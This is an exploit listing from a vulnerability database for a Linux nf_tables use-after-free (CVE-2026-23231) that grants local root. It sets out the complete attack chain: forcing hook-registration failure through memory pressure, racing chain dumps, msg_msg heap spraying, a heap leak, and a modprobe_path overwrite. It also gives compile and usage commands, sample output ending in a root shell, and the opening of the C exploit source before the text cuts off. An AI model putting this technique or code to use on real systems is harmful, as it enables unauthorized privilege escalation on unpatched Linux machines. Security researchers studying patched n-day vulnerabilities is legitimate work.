---
title: Linux nf_tables 6.19.3 Local Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2026050019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-23
fetch_date: 2026-05-24T06:00:43.186102
---

# Linux nf_tables 6.19.3 Local Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Linux nf\_tables 6.19.3 Local Privilege Escalation** **2026.05.23**  Credit:  **[Aviral Srivastava](https://cxsecurity.com/author/Aviral%2BSrivastava/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **[CVE-2026-23231](https://cxsecurity.com/cveshow/CVE-2026-23231/ "Click to see CVE-2026-23231")** | **[CVE-2024-1086](https://cxsecurity.com/cveshow/CVE-2024-1086/ "Click to see CVE-2024-1086")** | **[CVE-2023-32233](https://cxsecurity.com/cveshow/CVE-2023-32233/ "Click to see CVE-2023-32233")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

\* Exploit Title: Linux Kernel 3.16 – 6.19.3 nf\_tables RCU UAF LPE
\* CVE: CVE-2026-23231
\* Date: 2026-03-19
\* Exploit Author: Aviral Srivastava
\* Vendor: Linux Kernel (kernel.org)
\* Affected: 3.16 – 6.19.3
\* Fixed in: 6.1.165, 6.6.128, 6.12.75, 6.18.14, 6.19.4
\* (commit 71e99ee20fc3f662555118cf1159443250647533)
\* Tested on: Ubuntu 24.04 LTS (kernel 6.8.0-45-generic x86\_64)
\* Type: Local Privilege Escalation
\* Platform: Linux x86\_64
\* CVSS: 7.8 (HIGH)
\*
\* ┌──────────────────────────────────────────────────────────────────┐
\* │ N-DAY — THIS VULNERABILITY IS PATCHED. FIX YOUR KERNELS. │
\* └──────────────────────────────────────────────────────────────────┘
\*
\* DESCRIPTION:
\* nf\_tables\_addchain() in net/netfilter/nf\_tables\_api.c publishes a
\* newly created chain to the table's chain list via list\_add\_tail\_rcu()
\* BEFORE registering hooks. If nf\_tables\_register\_hook() subsequently
\* fails (e.g., due to OOM during IPv6 hook allocation for NFPROTO\_INET
\* chains), the error path calls nft\_chain\_del() (list\_del\_rcu) followed
\* immediately by nf\_tables\_chain\_destroy() — freeing the chain memory
\* WITHOUT calling synchronize\_rcu().
\*
\* This creates a use-after-free: concurrent RCU readers — both
\* nf\_tables\_dump\_chains() in the control plane and nft\_do\_chain() in
\* the packet path — can access the freed nft\_base\_chain memory. The
\* freed object (~224 bytes) resides in kmalloc-256 and can be reclaimed
\* with user-controlled spray objects (msg\_msg via msgsnd).
\*
\* The exploit races a chain dump against the UAF trigger, then sprays
\* the freed slot with msg\_msg to control chain fields. The corrupted
\* chain data is used to leak kernel heap addresses and ultimately
\* overwrite modprobe\_path for privilege escalation.
\*
\* TECHNIQUE:
\* Trigger hook registration failure via memory pressure (cgroup v2
\* memory limit). Race nf\_tables\_dump\_chains() against the error path
\* to read stale chain data (heap leak). Spray freed kmalloc-256 slot
\* with msg\_msg. Use modprobe\_path overwrite for escalation. Data-only
\* attack — no code execution needed, bypasses kCFI.
\*
\* RELIABILITY:
\* ~30-50% success rate per attempt. Race window is narrow (~5-20us).
\* Typically requires 3-8 attempts. Each failed attempt may cause a
\* kernel oops (process killed) but is retried from a fresh namespace.
\* Kernel panic is possible (~5% of failures) if spray timing is wrong.
\*
\* MITIGATIONS:
\* KASLR: Bypassed via stale chain data heap leak + hardcoded
\* offsets for target kernel version
\* SMEP: Not applicable (data-only attack)
\* SMAP: Not applicable (all data in kernel slab)
\* kCFI: Not applicable (data-only — modprobe\_path overwrite)
\* SLUB Hardening: Minimal impact (freelist ptr at offset 0 only)
\*
\* FIX:
\* Commit: 71e99ee20fc3f662555118cf1159443250647533
\* URL: https://git.kernel.org/stable/c/71e99ee20fc3f662555118cf1159443250647533
\* Adds synchronize\_rcu() between nft\_chain\_del() and chain destroy.
\*
\* COMPILATION:
\* gcc -Wall -Wextra -o exploit exploit.c -lpthread -static
\*
\* USAGE:
\* $ ./exploit
\* [\*] CVE-2026-23231 — Linux nf\_tables RCU UAF LPE
\* [\*] Target: kernel < 6.19.4 (nf\_tables addchain RCU race)
\* [+] Running kernel 6.8.0-45-generic — VULNERABLE
\* [\*] Step 1: Creating user/net namespace...
\* [+] Namespace created, CAP\_NET\_ADMIN obtained
\* [\*] Step 2: Setting up nftables infrastructure...
\* [+] Table and chains created
\* [\*] Step 3: Triggering UAF via hook registration failure...
\* [+] UAF triggered — chain freed without synchronize\_rcu
\* [\*] Step 4: Spraying freed slot with msg\_msg...
\* [+] Heap spray complete
\* [\*] Step 5: Leaking kernel addresses via dump race...
\* [+] Kernel heap base: 0xffff888XXXXXXXXX
\* [\*] Step 6: Overwriting modprobe\_path...
\* [+] modprobe\_path = "/tmp/pwn"
\* [\*] Step 7: Triggering modprobe helper...
\* [+] Got root! uid=0 gid=0
\* # id
\* uid=0(root) gid=0(root)
\*
\* REFERENCES:
\* [1] https://nvd.nist.gov/vuln/detail/CVE-2026-23231
\* [2] https://git.kernel.org/stable/c/71e99ee20fc3f662555118cf1159443250647533
\* [3] CVE-2024-1086 — nf\_tables double-free LPE (technique reference)
\* [4] CVE-2023-32233 — nf\_tables anonymous set UAF (msg\_msg spray reference)
\*
\* DISCLAIMER:
\* This exploit targets an ALREADY PATCHED vulnerability. It is provided
\* for educational and authorized security research purposes only. The
\* author is not responsible for misuse. Test only on systems you own.
\* ═══════════════════════════════════════════════════════════════════════
\*/
#define \_GNU\_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mount.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf\_tables.h>
#include <arpa/inet.h>
/\* ─── Constants ─────────────────────────────────────────────────────── \*/
#define BANNER \
"═══════════════════════════════════════════════════════════════\n" \
" CVE-2026-23231 — Linux nf\_tables RCU UAF LPE\n" \
" nf\_tables\_addchain() use-after-free (missing synchronize\_rcu)\n" \
" Affected: kernel 3...